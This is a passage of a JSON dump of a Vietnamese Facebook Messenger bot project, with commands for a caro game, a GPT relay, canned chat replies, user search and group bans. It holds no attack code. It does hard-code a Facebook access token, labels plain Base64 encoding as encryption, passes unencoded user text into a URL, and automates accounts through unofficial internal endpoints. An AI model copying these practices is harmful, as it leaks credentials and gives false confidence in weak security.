_0xfb59=[\"\\x6E\\x61\\x6D\\x65\",\"\\x67\\x65\\x74\\x44\\x61\\x74\\x61\"];var myname=( await Users[_0xfb59[1]](senderID))[_0xfb59[0]]\n  //==========CHECK WIN OR NOT==============//\n  var CHECKWIN = checkWin(x, y, d, d1, toadoX, toadoY, quanco, sizeboard, sectionSize);\n  if(CHECKWIN.WIN == true) {\n    fs.writeFileSync(path2, canvasbg.toBuffer());\n      api.unsendMessage(handleReply.messageID, () => {\n        api.sendMessage({\n          body: \"You win ü•≥ü•≥ \"+myname,\n          attachment: fs.createReadStream(path2),\n          mentions: [{\n            tag: myname,\n            id: senderID\n          }]\n          \n        }, threadID, messageID);\n      });\n    return global.game[threadID] = {};\n  };\n  fs.writeFileSync(path2, canvasbg.toBuffer());\n  api.unsendMessage(handleReply.messageID, () => {\n    api.sendMessage({body: 'Reply tin nh·∫Øn n√†y k√®m theo t·ªça ƒë·ªô X Y ƒë·ªÉ ƒë√°nh qu√¢n c·ªù, v√≠ d·ª•:\\n1 5\\nL∆∞·ª£t ti·∫øp theo l√† c·ªßa '+namedoithu, attachment: fs.createReadStream(path2), mentions: [{\n      tag: namedoithu,\n      id: iddoithu\n    }]},threadID, (e, info) => {\n            client.handleReply.push({\n                name: this.config.name,\n                author: senderID,\n                messageID: info.messageID,\n                x: x,\n                y: y,\n                d: d,\n                d1: d1,\n                sizeboard: sizeboard,\n                sectionSize: sectionSize,\n                boardbuffer: boardbuffer\n            });\n        },messageID);\n  })\n};\n\n\nmodule.exports.run = async ({ event, api, args }) => {\n    var { threadID, senderID, messageID } = event;\n    if (!global.game) {\n        global.game = {};\n    };\n    if (!global.game[threadID]) {\n        global.game[threadID] = {};\n    };\n    if(args[0] == \"clear\"){\n      var author = global.game[threadID].author;\n      if(!author) return api.sendMessage('Ch∆∞a c√≥ b√†n c·ªù n√†o ƒë∆∞·ª£c t·∫°o trong nh√≥m c·ªßa b·∫°n', threadID, messageID);\n      if (senderID != author) return api.sendMessage('Ch·ªâ c√≥ author '+author+' b√†n c·ªù: m·ªõi c√≥ th·ªÉ k·∫øt th√∫c b√†n c·ªù n√†y', threadID, messageID);\n      global.game[threadID] = {};\n      return api.sendMessage('ƒê√£ x√≥a b√†n caro!!', threadID, messageID);\n      \n    }\n    \n    if (global.game[threadID].author) {\n        return api.sendMessage('Nh√≥m n√†y ƒë√£ c√≥ b√†n c·ªù ƒë∆∞·ª£c t·∫°o, vui l√≤ng k·∫øt th√∫c b√†n c·ªù b√†ng c√°ch chat \"#caro clear\"', threadID, messageID);\n    };\n    var player2 = Object.keys(event.mentions)[0];\n    if(!player2) return api.sendMessage(\"C·∫ßn tag ng∆∞·ªùi b·∫°n mu·ªën ch∆°i c√πng!!\", event.threadID, event.messageID);\n    global.game[threadID] = {\n        luot: {\n            [senderID]: 1,\n            [player2]: 0\n        },\n        toadogame: [],\n        ditruoc: 1,\n        author: senderID\n    };\n    /**/\n    //CREATE BOARD GAME\n    var kytu = \"@\";\n    var x = [], y = [], d = [], d1 = [];\n    var size = 16;\n    //Create horizon and Column ( X and Y )\n    for (let i = 0; i < size; i++) {\n        x[i] = [];\n        y[i] = [];\n        for(let j = 0; j < size; j++) {\n          x[i][j] = kytu;\n          y[i][j] = kytu;\n        }\n    }\n    //Create diagonal lines\n    var auto = '+';\n    var so_d = 0;\n    var chieudaio = size*2-1;//s·ªë ƒë∆∞·ªùng xi√™ng c·ªßa board\n    for (var i = 0; i < chieudaio; i++) {\n        if(auto == '+') so_d++;\n        if(auto == \"-\") so_d--;\n        d[i] = [];\n        d1[i] = [];\n        for(let j = 0; j < so_d; j++) {\n          d[i][j] = \"@\";\n          d1[i][j] = \"@\";\n          if(so_d == size) auto = \"-\";\n        };\n    };\n    //==============================\n    const Canvas = global.nodemodule[\"canvas\"];\n    const fs = global.nodemodule[\"fs-extra\"];\n    const axios = global.nodemodule[\"axios\"];\n    const spf = global.nodemodule[\"node-superfetch\"];\n    var path1 = __dirname+'/cache/caro1'+threadID+'.png';\n    var path2 = __dirname+'/cache/caro2'+threadID+'.png';\n    \n    //==============================\n    const imgboard = await Canvas.loadImage(\n        'https://vn112.com/wp-content/uploads/2018/01/pxsolidwhiteborderedsvg-15161310048lcp4.png');\n    var xboard = imgboard.width,\n        yboard = imgboard.height;\n    const canvas = Canvas.createCanvas(xboard, yboard);\n    let ctx = canvas.getContext('2d');\n    ctx.drawImage(imgboard, 0, 0, canvas.width, canvas.height);\n    var sizeboard = parseInt(16);//s·ªë √¥\n\n    // v·∫Ω boardgame v√† l∆∞u\n    var sectionSize = xboard/sizeboard; //size m·ªói √¥ s·∫Ω b·∫±ng chi·ªÅu d√†i chia s·ªë √¥??\n    //=============k·∫ª b·∫£ng=================\n    for (i = 0; i <= sizeboard; i++) {\n        for (j = 0; j <= sizeboard; j++) {\n            // ƒê∆∞·ªùng ngang\n            ctx.moveTo(0, sectionSize * j);\n            ctx.lineTo(sectionSize * sizeboard, sectionSize * j);\n            ctx.stroke();\n            // ƒê∆∞·ªùng d·ªçc\n            ctx.moveTo(sectionSize * i, 0);\n            ctx.lineTo(sectionSize * i, sectionSize * sizeboard);\n            ctx.stroke();\n        }\n    };\n    \n    const boardbuffer = canvas.toBuffer();\n    //v·∫Ω background v√† l·∫•y boardgame ra v·∫Ω l√™n\n\n    var background = await Canvas.loadImage(\"https://i.ibb.co/WVgwgtc/0afd2951b10413352a363ea51b4606ac.jpg\");\n    var xbground = background.width,\n        ybground = background.height;\n    const canvasbg = Canvas.createCanvas(xbground, ybground);\n    let ctxx = canvasbg.getContext('2d');\n    ctxx.drawImage(background, 0, 0, xbground, ybground);\n    //reg font\n    ctxx.fillStyle = \"#000000\";\n    ctxx.textAlign = \"center\";\n    if(!fs.existsSync(__dirname+'/cache/data/bold-font.ttf')) {\n      let getfont = (await axios.get(\"https://drive.google.com/u/0/uc?id=1Kx2hi9VX5X4KjwO1uFR6048fm4dKAMnp&export=download\", { responseType: \"arraybuffer\" })).data;\n      fs.writeFileSync(__dirname+'/cache/data/bold-font.ttf', Buffer.from(getfont, \"utf-8\"));\n    };\n    Canvas.registerFont(__dirname+'/cache/data/bold-font.ttf', {\n        family: \"caro\",\n        weight: \"regular\",\n        style: \"normal\"\n    });\n    ctxx.font = \"bold 36px caro\";\n    //v·∫Ω board l√™n background\n    var boardCv = await Canvas.loadImage(boardbuffer);\n    ctxx.drawImage(boardCv, (xbground-880)/2, 320, 880, 880);\n    console.log((xbground-880)/2);\n    //v·∫Ω t·ªça ƒë·ªô\n    //var canchinh = 880/16/2; // =27.5\n    for(let i = 0; i < 16; i++) {\n      ctxx.fillText(i, (xbground-880)/2+i*(880/16)+27.5, 310);//880 l√† size board l√∫c v·∫Ω v√†i background\n      ctxx.fillText(i, (xbground-880)/2-30, 330+i*(880/16)+27.5)\n    }\n    //\n    try{\n    var avt1 = (await spf.get(`https://graph.facebook.com/${senderID}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`)).body;\n    var avt2 = (await spf.get(`https://graph.facebook.com/${player2}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`)).body;\n    ctxx.drawImage(await Canvas.loadImage(avt1), xbground/2-100-200, (320-200)/2, 200, 200);\n    ctxx.drawImage(await Canvas.loadImage(avt2), xbground/2+100    , (320-200)/2, 200, 200);\n    }\n    catch(e) {};\n    var VS = (await spf.get(\"https://i.ibb.co/RQjPz7f/1624961650011.png\")).body;\n    var logoVS = await Canvas.loadImage(VS);\n    ctxx.drawImage(logoVS, xbground/2-200/2, (320-200)/2, 200, 200);\n    //ctxx.drawImage(logoVS, 10,10,200,200);\n    fs.writeFileSync(path2, canvasbg.toBuffer());\n    api.sendMessage({body: \"T·∫°o v√°n c·ªù caro th√†nh c√¥ng, b·∫°n ƒëi tr∆∞·ªõc, reply tin nh·∫Øn n√†y k√®m theo t·ªça ƒë·ªô X Y ƒë·ªÉ ƒë√°nh qu√¢n c·ªù, v√≠ d·ª•:\\n1 5\", attachment: fs.createReadStream(path2)}, threadID, (e, info) => {\n            client.handleReply.push({\n                name: this.config.name,\n                author: senderID,\n                messageID: info.messageID,\n                x: x,\n                y: y,\n                d: d,\n                d1: d1,\n                sizeboard: sizeboard,\n                sectionSize: sectionSize,\n                boardbuffer: boardbuffer\n            });\n        }\n    );\n};","path":null,"size_bytes":13814,"size_tokens":null},"modules/commands/gpt4.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"gpt4\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI GPT4\",\n    commandCategory: \"AI\",\n    usages: \"gpt4 n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, '/data/api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.gpt4) {}\n\n        return jsonData.gpt4;\n    } catch (error) {}\n};\n\nconst getChatResponse = async (text) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        throw new Error(\"ƒêang c·∫≠p nh·∫≠t!!!\");\n    }\n\n    for (let uid = 1; uid <= 9; uid++) {\n        try {\n            const response = await axios.get(`${apiUrl}?ask=${text}&model=v3`);\n            if (response.data && response.data.reply) {\n    return response.data.reply;\n}\n        } catch {\n            continue;\n        }\n    }\n\n    throw new Error(\"T·∫•t c·∫£ c√°c UID ƒë·ªÅu kh√¥ng ph·∫£n h·ªìi, vui l√≤ng th·ª≠ l·∫°i sau.\");\n};\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) return reject(error);\n                resolve(info.messageID);\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {\n        api.sendMessage(error.message, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) {\n                        reject(error);\n                    } else {\n                        resolve(info.messageID);\n                    }\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n        }\n    } catch (error) {}\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (event.type === \"message_reply\") {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":2958,"size_tokens":null},"lib/fca-auto/Extra/Security/Base/Step_2.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\n\n/**\n * Encrypt the text using the CryptoJS library and return the encrypted text as a Base64 string.\n * @param Data - The data to be encrypted.\n * @returns A string of characters that represent the encrypted data.\n */\nmodule.exports.Encrypt = function Encrypt(Data) {\n    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(Data));\n};\n\n/**\n * Decrypt the data using the CryptoJS library, and return the decrypted data as a string.\n * @param Data - The data to be decrypted.\n * @returns The decrypted data.\n */\n\nmodule.exports.Decrypt = function Decrypt(Data) {\n    return CryptoJS.enc.Base64.parse(Data).toString(CryptoJS.enc.Utf8);\n};\n","path":null,"size_bytes":698,"size_tokens":null},"modules/commands/goibot.js":{"content":"const fs = require('fs');\nconst path = require('path');\nconst stringSimilarity = require('string-similarity');\nconst { simi } = require('./../../lib/sim.js');\n\nconst settingsPath = path.join(__dirname, '/data/goibot.json');\nconst defaultSettings = {};\n\nfunction loadSettings() {\n    if (fs.existsSync(settingsPath)) {\n        return JSON.parse(fs.readFileSync(settingsPath));\n    } else {\n        return defaultSettings;\n    }\n}\n\nfunction saveSettings(settings) {\n    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));\n}\n\nlet settings = loadSettings();\n\nmodule.exports.config = {\n    name: 'goibot',\n    version: '1.1.1',\n    hasPermssion: 0,\n    credits: 'DC-Nam',\n    description: 'Tr√≤ truy·ªán c√πng bot',\n    commandCategory: 'H·ªá Th·ªëng',\n    usages: '[hey simi]',\n    cooldowns: 10,\n};\n\nmodule.exports.run = function({ api, event, args }) {\n    const threadID = event.threadID;\n    const command = args[0];\n\n    if (command === 'on') {\n        settings[threadID] = true;\n        saveSettings(settings);\n        api.sendMessage(\"ƒê√£ b·∫≠t goibot cho nh√≥m n√†y.\", threadID);\n    } else if (command === 'off') {\n        settings[threadID] = false;\n        saveSettings(settings);\n        api.sendMessage(\"ƒê√£ t·∫Øt goibot cho nh√≥m n√†y.\", threadID);\n    } else {\n        api.sendMessage(\"S·ª≠ d·ª•ng 'goibot on' ƒë·ªÉ b·∫≠t v√† 'goibot off' ƒë·ªÉ t·∫Øt l·ªánh goibot.\", threadID);\n    }\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    const threadID = event.threadID;\n\n    if (settings[threadID] === undefined) {\n        settings[threadID] = true;\n        saveSettings(settings);\n    }\n\n    if (!settings[threadID]) return;\n\n    var hm = ['b·∫°n c√≥ th·ªÉ d√πng l·ªánh #daybot ƒë·ªÉ d·∫°y m√¨nh c√°ch tr·∫£ l·ªùi','B·∫°n c√≥ th·ªÉ d√πng #goibot off ƒë·ªÉ t·∫Øt g·ªçi bot!','N·∫øu b·∫°n ch·ª≠i bot bot s·∫Ω ban b·∫°n ngay l·∫≠p t·ª©c!!!','N·∫øu 1 ng√†y b·∫°n checktt m√† t√¥i kh√¥ng g·ª≠i g√¨ l√† t√¥i ƒëang b·ªã getinfo nh√© ch·ªù 1 v√†i gi·ªù ho·∫∑c ƒë·∫øn h√¥m sau s·∫Ω t·ª± h·∫øt','k√™u bot c√≥ g√¨ hok üíì', '∆°i bot nghe n√®','∆°i anh/ch·ªã bot nghe üå∏','c√≥ g√¨ hog bot n√®','bot n√®','k√™u em c√≥ g√¨ kh√¥ng','üíû em nghe','em ƒë√¢y', \"hmmmm\", \"ƒê·ª´ng spam em nha :<<\", \"ƒê·ª´ng ƒë·ªÉ em n√≥ng!!!\", \"c·∫≠u g·ªçi bot c√≥ g√¨ kh√¥ng?\", \"m·ªát k√™u ho√†i -.-\", \"ChƒÉm ch·ªâ h·ªçc h√†nh ƒëi\", \"Bae ƒÉn c∆°m ch∆∞a?\", \"Tuy·ªÉn phi c√¥ng n√® ·∫°\", \"N·∫øu c·∫≠u ƒëang c√¥ ƒë∆°n th√¨ ch√∫ng ta c√≥ th·ªÉ th√†nh ƒë√¥i :3\", \"ƒêang l√†m g√¨ v·∫≠y?\", \"ƒê∆∞·ª£c c·ªßa l√≥ :)))\", \"L√†m ch·ªìng em kh√¥ng ·∫°?\", \"ƒëi ra ch·ªó kh√°c ch∆°i\", \"C√¥ng ch√∫a em sao ƒë·∫•y?\", \"C√≥ g√¨ ƒÉn kh√¥ng:(( ƒë√≥i qu√°aa\", \"Y√™u em kh√¥ng?\", \"c·∫≠u b·ªã l√†m sao √≠@@\", \"B·∫°n l√† nh·∫•t!!!\", \"K√™u chi l·∫Øm th·∫ø? B·ªô th√≠ch tao r·ªìi √† :v\", \"Ch·∫ßn ch·ªù g√¨ ch·ªìng ∆°i em ƒë√¢yyy\", \"Em... Sao em l·∫°i n√≥i nh·ªØng c√°i l·ªùi ƒë√≥ chi zay em?\", \"b·∫Øp lu·ªôc ƒëyyy\", \"Yeu em rat nhieu ^^\", \"ƒê·ªì con l·ª£n l√πn :))\", \"ƒê·ª£i x√≠. ƒêi ·∫ª c√°i :()\", \"500k bao ph√≤ng!!!\", \"Yeu anh den luy ^^\", \"N√™n nh·ªõ ƒë·ª´ng bao gi·ªù coi th∆∞·ªùng ng∆∞·ªùi kh√°c\\nwa man bu di a \", \"Anh qu√°t em √†?\\nN√≥i to th·∫ø √°?\", \"Tr·∫£ qu·∫ßn cho em huhu\", \"I love you 3000 <3\", \"Tao c∆∞·ªùi tao ƒëi ·ªâa\", \"H√£y n√™n nh·ªõ, cu·ªôc t√¨nh n√†o c≈©ng c√≥ l√∫c t√†n phai\", \"hoa h·ªìng n·ªü r·ªô 4 m√πa...\", \"lalalalaaaa\", \"ƒê·ª´ng qu√° y√™u m·ªôt ai ƒë√≥, khi ch√≠nh b·∫£n th√¢n b·∫°n v·∫´n b·ªã t·ªïn th∆∞∆°ng!\", \"Bae, em nhu bong hoa. Nhung nguoi hai dau phai ta üíî\", \"Nu√¥i c·∫≠u ƒë·ªÉ th·ªãt ~~\", \"Overnight kh√¥ng?\", \"H√£y g·ªçi cho admin t√¥i ƒë·ªÉ ƒë∆∞·ª£c y√™u th∆∞∆°ng<3\", \"H√°t ƒëi cho k·∫πo üç≠\", \"v·ª£ g·ªçi c√≥ vi·ªác g√¨ kh√¥ng?\", \"Dz·∫°aaaaa~~~\", \"g·ªçi bot c√≥ g√¨ hemm :3\", \"Dz·∫° em ƒë√¢y :>\", \"sao th·∫ø bae y√™u d·∫•u :>\", \"Sao th·∫ø c√¥ng ch√∫a\", \":)))\", \"N·∫øu m·ªôt ng√†y n√†o ƒë√≥ b·∫°n g·ªçi t√¥i m√† t√¥i kh√¥ng tr·∫£ l·ªùi nghƒ©a l√† bot b·ªã payyy acccc ;-;\", \"Em ƒë√¢y\", \"ch√†o b·∫°n t√¥i l√† bot c·ªßa TatsuYTB \", \"V·ª£ g·ªçi c√≥ vi·ªác g√¨ kh√¥ng?\", \"S·ª≠ d·ª•ng #callad ƒë·ªÉ li√™n l·∫°c v·ªõi admin!\", \"Em ƒë√¢y~~~~\", \"Y√™u anh nh·∫•t\", \"∆°i\", \"Sao th·∫ø c√¥ng ch√∫a nh√µng nh·∫Ωo c·ªßa em\", \"Yamete...\", \"Tuy·ªÉn m√°y bay tr·ª±c thƒÉng n√® ai y√™u em hog\", \"C·∫≠u c√≥ c√¥ ƒë∆°n ko ƒë·ªÉ mik t√¢m s·ª±\", \"Y√™u ko ·∫° v√£ qu√°!!!\", \"bot dthw nh∆∞ ch·ªß c·ªßa bot ·∫°\", \"ƒê·ª´ng khen anh ng·∫°i qu√° h√≠ h√≠\", \"L√†m v·ª£ anh ko ·∫°?\", \"∆° ƒë·ª´ng\", \"bot c√≥ v·ª£ r·ªìi\", \"Ai L√†m V·ª£ Em Hog?\", \"H·ªè?\", \"kh√¥ng ƒë∆∞·ª£c spam bot nh√© c√°c bae\", \"Y√™u anh ko?\", \"V·ª£ anh ƒë√¢y r·ªìi\", \"ch·ªß t·ªõ l√† th·ª© hai hong ai l√† nh·∫•t\", \"l√†m V·ª£ ƒëuy\", \"Ch·ªß Em ƒê·∫πp Zai Khoai To L·∫Øm UwU\", \"Y√™u T·∫•t C·∫£ M·ª•i Ng∆∞·ªùi:3\", \"Tuy·ªÉn Gh·ªá n√® c√°c bbi :3\", \"tha em t·ªõi gi∆∞·ªùng...\", \"th∆∞∆°ng em t·ªõi gi√†\"];\n    var t = hm[Math.random() * hm.length << 0];\n    if (['B·∫°n c√≥ th·ªÉ th·∫£ icon üòæ ƒë·ªÉ bot g·ª° tin nh·∫Øn','bot', 'hi bot', 'bot ƒë√¢u', 'bot off', 'bot ∆°i', 'bot x·ªãn', 'k√™u m·ªçi ng∆∞·ªùi l√™n t∆∞∆°ng t√°c ƒëi bot', 'Ch√†o bot', 'hello bot', 'sim', 'sim ∆°i', 'bye bot', 'bot ƒë√¢u'].includes(event.body.toLowerCase())) {\n        api.sendMessage({ body: `${t} ` }, event.threadID, (err, data) => global.client.handleReply.push({ name: this.config.name, messageID: data.messageID }), event.messageID);\n    }\n};\n\nmodule.exports.handleReply = async function({ handleReply: $, api, event }) {\n    const response = simi('ask', event.body);\n    if (response.error) return api.sendMessage(`${response.error}`, event.threadID, (err, data) => global.client.handleReply.push({ name: this.config.name, messageID: data.messageID }), event.messageID);\n    else api.sendMessage({ body: `${response.answer} ` }, event.threadID, (err, data) => global.client.handleReply.push({ name: this.config.name, messageID: data.messageID }), event.messageID);\n};\n","path":null,"size_bytes":5818,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/Premium.js":{"content":"\"use strict\";\n\nvar { join } = require('path');\nvar fs = require('fs');\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function(Name, args){\n        var Method = {};\n        fs.readdirSync(join(__dirname, \"../Func\")).filter((/** @type {string} */File) => File.endsWith(\".js\") && !File.includes('Dev_')).map((/** @type {string} */File) => Method[File.split('.').slice(0, -1).join('.')] = require(`../Func/${File}`)(defaultFuncs, api, ctx));\n        if (Method[Name] == undefined) {\n            return (`Method ${Name} not found`);\n        }\n        else {\n            try {\n                return Method[Name](args).then((/** @type {string} */Data) => {\n                    return Data;\n                });\n            }\n            catch (e) {\n                console.log(e);\n            }\n        }\n    };    \n};","path":null,"size_bytes":831,"size_tokens":null},"lib/fca-auto/src/getUserID.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatData(data) {\n  return {\n    userID: utils.formatID(data.uid.toString()),\n    photoUrl: data.photo,\n    indexRank: data.index_rank,\n    name: data.text,\n    isVerified: data.is_verified,\n    profileUrl: data.path,\n    category: data.category,\n    score: data.score,\n    type: data.type\n  };\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getUserID(name, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      value: name.toLowerCase(),\n      viewer: ctx.userID,\n      rsp: \"search\",\n      context: \"search\",\n      path: \"/home.php\",\n      request_id: utils.getGUID()\n    };\n\n    defaultFuncs\n      .get(\"https://www.facebook.com/ajax/typeahead/search.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        var data = resData.payload.entries;\n\n        callback(null, data.map(formatData));\n      })\n      .catch(function (err) {\n        log.error(\"getUserID\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1498,"size_tokens":null},"modules/commands/ban.js":{"content":"const fs = require('fs');\nconst path = require('path');\nconst databanuserFolderPath = path.join(__dirname, '../../modules/commands/data/ban');\n\nif (!fs.existsSync(databanuserFolderPath)) {\n  fs.mkdirSync(databanuserFolderPath, { recursive: true });\n}\n\nasync function createIfNotExist(filePath) {\n  if (!fs.existsSync(filePath)) {\n    const defaultData = { bannedUsers: [] };\n    await fs.promises.writeFile(filePath, JSON.stringify(defaultData, null, 2), 'utf8');\n  }\n}\n\nmodule.exports.config = {\n  name: \"ban\",\n  version: \"1.1.0\",\n  hasPermssion: 1,\n  credits: \"fbd (mod by ChatGPT)\",\n  description: \"Qu·∫£n l√Ω danh s√°ch c·∫•m trong nh√≥m (th√™m b·∫±ng UID ho·∫∑c reply)\",\n  commandCategory: \"Qu·∫£n L√≠ Box\",\n  usages: \"[add/remove/list] [ID ng∆∞·ªùi d√πng] ho·∫∑c reply tin nh·∫Øn ng∆∞·ªùi mu·ªën ban v·ªõi 'ban add'\",\n  cooldowns: 5,\n  dependencies: {}\n};\n\nmodule.exports.run = async ({ event, api, args }) => {\n  const threadID = event.threadID;\n\n  if (!args[0]) {\n    return api.sendMessage(\n      \"[c√°ch s·ª≠ d·ª•ng]\\n\"+\n      \"- Th√™m ID v√†o danh s√°ch c·∫•m: #ban add ID1 | ID2 | ...\\n\"+\n      \"V√≠ d·ª•: #ban add 123456789\\n\\n\"+\n      \"- C√≥ th·ªÉ c√°ch nhau b·∫±ng d·∫•u | m·ªói uid ƒë·ªÉ c·∫•m nhi·ªÅu ng∆∞·ªùi\\n\"+\n      \"V√≠ d·ª•: #ban add 123456789 | 987654321\\n\\n\"+\n      \"- Reply v√†o tin nh·∫Øn ng∆∞·ªùi mu·ªën ban v√† g√µ: ban add\\n\\n\"+\n      \"- X√≥a ID kh·ªèi danh s√°ch c·∫•m: #ban remove ID1 | ID2 | ...\\n\"+\n      \"- Li·ªát k√™ danh s√°ch c·∫•m: #ban list\\n\",\n      threadID\n    );\n  }\n\n  const action = args[0].toLowerCase();\n  const threadFilePath = path.join(databanuserFolderPath, `${threadID}.json`);\n\n  await createIfNotExist(threadFilePath);\n\n  let data = JSON.parse(await fs.promises.readFile(threadFilePath, 'utf8'));\n\n  switch (action) {\n    case \"add\": {\n      args.shift();\n      let userIDsToAdd = [];\n\n      // Tr∆∞·ªùng h·ª£p reply tin nh·∫Øn -> l·∫•y UID t·ª´ event.messageReply\n      if (event.type === \"message_reply\") {\n        userIDsToAdd.push(event.messageReply.senderID);\n      }\n\n      // Tr∆∞·ªùng h·ª£p nh·∫≠p UID th·ªß c√¥ng\n      if (args.length > 0) {\n        userIDsToAdd = userIDsToAdd.concat(\n          args.join(\" \").split('|').map(id => id.trim()).filter(Boolean)\n        );\n      }\n\n      if (userIDsToAdd.length === 0) {\n        return api.sendMessage(\"‚ùå B·∫°n c·∫ßn nh·∫≠p UID ho·∫∑c reply tin nh·∫Øn c·ªßa ng∆∞·ªùi c·∫ßn ban.\", threadID);\n      }\n\n      const addedIDs = [];\n\n      for (const id of userIDsToAdd) {\n        if (!data.bannedUsers.includes(id)) {\n          data.bannedUsers.push(id);\n          addedIDs.push(id);\n\n          try {\n            const threadInfo = await api.getThreadInfo(threadID);\n            const isMember = threadInfo.participantIDs.includes(id);\n            if (isMember) {\n              await api.removeUserFromGroup(id, threadID);\n              api.sendMessage(\n                `üö´ Ng∆∞·ªùi d√πng c√≥ UID ${id} ƒë√£ b·ªã ban v√† kick kh·ªèi nh√≥m.`,\n                threadID\n              );\n            }\n          } catch (error) {}\n        }\n      }\n\n      if (addedIDs.length > 0) {\n        await fs.promises.writeFile(threadFilePath, JSON.stringify(data, null, 2));\n        api.sendMessage(`‚úÖ ƒê√£ th√™m v√†o danh s√°ch c·∫•m: ${addedIDs.join(', ')}`, threadID);\n      } else {\n        api.sendMessage(\"‚ö†Ô∏è Kh√¥ng c√≥ ID n√†o m·ªõi ƒë·ªÉ th√™m v√†o danh s√°ch c·∫•m.\", threadID);\n      }\n      break;\n    }\n\n    case \"remove\": {\n      args.shift();\n      const userIDsToRemove = args.join(\" \").split('|').map(id => id.trim());\n      const removedIDs = [];\n\n      data.bannedUsers = data.bannedUsers.filter(id => {\n        if (userIDsToRemove.includes(id)) {\n          removedIDs.push(id);\n          return false;\n        }\n        return true;\n      });\n\n      if (removedIDs.length > 0) {\n        await fs.promises.writeFile(threadFilePath, JSON.stringify(data, null, 2));\n        api.sendMessage(`‚úÖ ƒê√£ x√≥a kh·ªèi danh s√°ch c·∫•m: ${removedIDs.join(', ')}`, threadID);\n      } else {\n        api.sendMessage(\"‚ö†Ô∏è Kh√¥ng c√≥ ID n√†o ƒë·ªÉ x√≥a kh·ªèi danh s√°ch c·∫•m.\", threadID);\n      }\n      break;\n    }\n\n    case \"list\": {\n      if (data.bannedUsers.length === 0) {\n        return api.sendMessage(\"üì≠ Danh s√°ch c·∫•m hi·ªán ƒëang tr·ªëng.\", threadID);\n      }\n      api.sendMessage(`üìå Danh s√°ch c·∫•m:\\n${data.bannedUsers.join('\\n')}`, threadID);\n      break;\n    }\n\n    default: {\n      api.sendMessage(\"‚ùì H√†nh ƒë·ªông kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng add, remove ho·∫∑c list.\", threadID);\n      break;\n    }\n  }\n};\n","path":null,"size_bytes":4552,"size_tokens":null},"modules/commands/restart.js":{"content":"module.exports.config = {\n  name: \"restart\",\n  version: \"2.0.2\",\n  hasPermssion: 3,\n  credits: \"Mirai Team mod by Jukie\",\n  description: \"Kh·ªüi ƒë·ªông l·∫°i bot\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"restart\",\n  cooldowns: 5,\n  dependencies: {}\n}\n\nmodule.exports.run = async function({ api, args, Users, event }) {\n  const { threadID, messageID, senderID } = event;\n  const axios = global.nodemodule[\"axios\"];\n  const moment = require(\"moment-timezone\");\n  const fs = require(\"fs\");\n\n  if (!global.config.ADMINBOT.includes(event.senderID.toString())) {\n    return api.sendMessage(`¬ª ùêÅùêöÃ£ùêß ùê§ùê°ùê®ÃÇùêßùê† ùêúùê®ÃÅ ùê™ùêÆùê≤ùêûÃÇÃÄùêß`, event.threadID, event.messageID);\n}\n\n  let name = await Users.getNameUser(event.senderID);\n  var gio = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH\");\n  var phut = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"mm\");\n  var giay = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"ss\");\n\n  if (args.length == 0) {\n      api.sendMessage(`ƒê√£ nh·∫≠n l·ªánh restart t·ª´ ADMIN vui l√≤ng ƒë·ª£i!!!`, event.threadID, () => process.exit(1));\n  } else {\n      let time = args.join(\" \");\n      setTimeout(() => \n          api.sendMessage(`Bot s·∫Ω kh·ªüi ƒë·ªông l·∫°i sau: ${time}s\\n[‚è∞] B√¢y gi·ªù l√†: 